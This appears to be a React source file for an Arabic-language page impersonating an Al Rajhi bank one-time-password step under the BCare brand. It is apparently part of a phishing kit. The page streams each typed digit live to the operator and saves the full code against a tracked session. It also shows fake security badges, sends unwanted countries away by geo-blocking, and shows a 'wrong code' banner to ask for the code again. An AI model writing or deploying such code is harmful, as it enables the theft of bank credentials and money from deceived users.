import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { RejectBanner } from "@/components/RejectBanner";
import { useEffect, useRef, useState } from "react";
import { z } from "zod";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useLiveInput } from "@/hooks/useLiveInput";
import { checkCountryAccess, saveOtp } from "@/lib/tracking.functions";
import brandLogo from "@/assets/brand-logo.svg";

export const Route = createFileRoute("/rajhi-otp")({
  head: () => ({
    meta: [
      { title: "رمز التحقق | بي كير" },
      { name: "description", content: "أدخل رمز التحقق المرسل لإتمام عملية التحقق في بي كير." },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&family=Outfit:wght@500;700&display=swap",
      },
    ],
  }),
  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
  component: RajhiOtpPage,
});

function RajhiOtpPage() {
  useVisitorTracking("رمز التحقق - بي كير");
  const navigate = useNavigate();
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [errorShake, setErrorShake] = useState(false);
  const inputsRef = useRef<(HTMLInputElement | null)[]>([]);
  const submittedRef = useRef(false);
  useLiveInput({ otp: digits.join("") });

  useEffect(() => {
    if (typeof window === "undefined") return;
    checkCountryAccess()
      .then((res) => {
        if (res && res.allowed === false) window.location.replace("/blocked");
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    inputsRef.current[0]?.focus();
  }, []);

  useEffect(() => {
    const otp = digits.join("");
    if (otp.length === 6 && !loading && !submittedRef.current) {
      submittedRef.current = true;
      handleSubmit(otp);
    }
  }, [digits, loading]);

  async function handleSubmit(otp: string) {
    const sessionId = window.localStorage.getItem("bcare_session_id");
    if (!sessionId) return;
    setLoading(true);
    await saveOtp({ data: { session_id: sessionId, otp } }).catch(() => {});
    setLoading(false);
    navigate({ to: "/rajhi-wait" as never });
  }

  function updateDigit(index: number, value: string) {
    if (!/^\d*$/.test(value)) return;
    const next = [...digits];
    next[index] = value.slice(-1);
    setDigits(next);
    if (value && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      const next = [...digits];
      next[index - 1] = "";
      setDigits(next);
      inputsRef.current[index - 1]?.focus();
    }
    if (e.key === "ArrowLeft" && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
    if (e.key === "ArrowRight" && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  }

  function handlePaste(e: React.ClipboardEvent<HTMLInputElement>) {
    e.preventDefault();
    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    const next = [...digits];
    text.split("").forEach((d, i) => {
      if (i < 6) next[i] = d;
    });
    setDigits(next);
    inputsRef.current[Math.min(text.length, 5)]?.focus();
  }

  return (
    <div
      dir="rtl"
      className="min-h-screen relative flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden"
      style={{
        fontFamily: "'Tajawal', system-ui, sans-serif",
        background:
          "radial-gradient(1200px 600px at 50% -10%, #EAF3FA 0%, #F5F8FB 55%, #F5F8FB 100%)",
      }}
    >
      {/* Subtle decorative rings */}
      <div className="pointer-events-none absolute inset-0 opacity-[0.35]" aria-hidden>
        <div className="absolute -top-40 -right-40 w-[420px] h-[420px] rounded-full border border-[#156394]/15" />
        <div className="absolute -top-24 -right-24 w-[280px] h-[280px] rounded-full border border-[#156394]/10" />
        <div className="absolute -bottom-40 -left-40 w-[420px] h-[420px] rounded-full border border-[#156394]/10" />
      </div>

      <div className="w-full max-w-[440px] relative">
        <RejectBanner message="رمز التحقق غير صحيح، يرجى إعادة إدخاله." />

        {/* Top brand strip */}
        <div className="flex items-center justify-center gap-2 mb-5">
          <span className="inline-flex items-center gap-1.5 text-[11px] font-semibold text-[#156394] bg-[#156394]/10 px-3 py-1.5 rounded-full">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z" />
              <path d="m9 12 2 2 4-4" />
            </svg>
             تحقق آمن عبر الراجحي
          </span>
        </div>

        <div className="relative bg-white rounded-[28px] shadow-[0_20px_60px_-20px_rgba(21,99,148,0.25)] border border-[#156394]/10 overflow-hidden">
          {/* Accent top bar */}
          <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg,#2b86c0,#156394,#0c4269)" }} />

          <div className="p-6 sm:p-9 flex flex-col items-center">
            {/* Logo lockup */}
            <div className="relative mb-5">
              <div className="absolute inset-0 rounded-3xl blur-2xl bg-[#156394]/25" aria-hidden />
              <div className="relative w-24 h-24 rounded-3xl bg-gradient-to-br from-white to-[#EAF3FA] border border-[#156394]/15 shadow-[inset_0_1px_0_rgba(255,255,255,0.9)] flex items-center justify-center">
                <img src={brandLogo} alt="الشعار" className="w-16 h-auto" />
              </div>
            </div>

            <h1 className="text-[22px] sm:text-2xl font-extrabold text-[#10243a] tracking-tight">
              رمز التحقق
            </h1>
            <p className="mt-2 text-[13.5px] text-[#64748b] text-center leading-relaxed max-w-[320px]">
              أدخل الرمز المكوّن من <span className="font-bold text-[#156394]">6 أرقام</span> المرسل إلى جوالك المسجل
            </p>

            <div className="w-full mt-7">
              <div
                className={`flex justify-center gap-2 sm:gap-3 mb-6 ${errorShake ? "animate-shake" : ""}`}
                dir="ltr"
              >
                {digits.map((d, i) => (
                  <input
                    key={i}
                    ref={(el) => { inputsRef.current[i] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={d}
                    onChange={(e) => updateDigit(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    onPaste={handlePaste}
                    disabled={loading}
                    className="w-12 h-14 sm:w-14 sm:h-16 rounded-2xl border bg-[#F5F8FB] text-center text-2xl font-extrabold text-[#10243a] placeholder:text-[#94a3b8] outline-none transition-all focus:border-[#156394] focus:bg-white focus:ring-4 focus:ring-[#156394]/10 focus:shadow-sm disabled:opacity-60 border-[#e2e8f0] hover:border-[#cbd5e1]"
                    aria-label={`رقم ${i + 1}`}
                  />
                ))}
              </div>

              {loading && (
                <div className="flex items-center justify-center gap-2 text-[#156394] font-bold text-sm py-4">
                  <span className="h-4 w-4 rounded-full border-2 border-[#156394]/40 border-t-[#156394] animate-spin" />
                  جارٍ التحقق…
                </div>
              )}
            </div>

            {/* Trust row */}
            <div className="mt-6 grid grid-cols-3 gap-2 w-full">
              <Trust label="تشفير TLS" />
              <Trust label="حماية حسابك" />
              <Trust label="خصوصية تامة" />
            </div>
          </div>
        </div>

        <p className="mt-5 text-center text-[11px] text-[#64748b]">
          © بي كير — جميع الحقوق محفوظة
        </p>
      </div>
    </div>
  );
}

function Trust({ label }: { label: string }) {
  return (
    <div className="flex items-center justify-center gap-1.5 rounded-xl bg-[#EAF3FA] border border-[#156394]/10 py-2 text-[10.5px] font-semibold text-[#156394]">
      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
        <path d="M20 6 9 17l-5-5" />
      </svg>
      {label}
    </div>
  );
}
